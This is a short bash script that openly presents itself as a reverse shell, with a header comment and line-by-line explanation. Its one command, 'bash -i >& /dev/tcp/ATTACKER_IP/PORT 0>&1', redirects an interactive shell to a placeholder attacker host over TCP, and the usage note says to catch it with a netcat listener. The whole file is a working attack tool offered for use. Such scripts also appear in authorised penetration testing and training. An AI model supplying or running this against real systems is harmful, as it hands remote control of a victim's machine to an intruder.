#!/bin/bash

#====================================================
# Bash Reverse Shell
# Author : Ryan Ellis (sweetrellish)
# Description : Initiates a reverse shell from a Linux
#               system back to a listener.
# Usage : Replace ATTACKER_IP and PORT with the attacker's
#         IP address and listening port before running.
#         Use nc -lvnp PORT
#====================================================

# Redirects input and output to a TCP connection
# - `bash -i`: Starts an interactive bash shell.
# - `>& /dev/tcp/ATTACKER_IP/PORT`: Redirects standard output and error to the TCP connection.
# - `0>&1`: Redirects standard input to the same TCP connection.
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1